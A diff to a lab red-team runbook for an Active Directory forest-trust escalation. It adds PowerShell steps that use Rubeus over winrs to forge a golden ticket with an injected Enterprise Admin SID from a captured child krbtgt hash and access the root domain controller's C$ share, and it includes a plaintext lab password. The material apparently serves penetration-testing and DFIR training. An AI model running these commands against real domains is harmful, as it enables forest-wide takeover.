@@ -1,10 +1,10 @@
-# CAMPAIGNS v2 — Phase 7 — Forest Trust Escalation (SID History)
+# CAMPAIGNS v3 — Phase 7 — Forest Trust Escalation (SID History)
 
-> **Campaign v2** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
-> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
+> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
+> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
 > **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
 >
-> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
+> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
 
 **Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.
 
@@ -16,12 +16,33 @@
 |                   |                                                   |
 | ----------------- | ------------------------------------------------- |
 | **Target**        | dc01 (.10) — root domain via parent-child trust   |
-| **From**          | Kali                                              |
+| **From**          | **mbr01** (using child krbtgt captured in Phase 6) |
 | **Starting cred** | Child krbtgt + child DA (from Phase 6)            |
 | **What you earn** | **Enterprise Admin** in cadre.local → root krbtgt |
+| **MITRE**         | T1550.002 (Use Alternate Auth Mat: Kerberos) + T1134.005 (SID-History Injection) |
 
 
-The child has a bidirectional transitive trust with the root. Forge a golden ticket with the root's EA SID injected via `-extra-sid`.
+The child has a bidirectional transitive trust with the root. From the mbr01 beachhead, forge a golden ticket with the root's EA SID injected via Rubeus, then authenticate to dc01.
+
+**Step 1 — Get root EA SID from mbr01 using child DA hash:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe lookupid /user:Administrator /domain:cadre.local /dc:192.168.77.10"
+```
+
+**Step 2 — Forge Golden Ticket on mbr01 with Rubeus:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe golden /user:Administrator /domain:child.cadre.local /sid:S-1-5-21-2616196951-1941128886-767624593 /rc4:<child_krbtgt_ntlm> /sids:S-1-5-21-<root>-519 /ptt"
+```
+
+**Step 3 — Use the ticket from mbr01 to access dc01:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "dir \\dc01.cadre.local\C$"
+```
+
+**Fallback from Kali:**
 
 ```bash
 # Get root EA SID
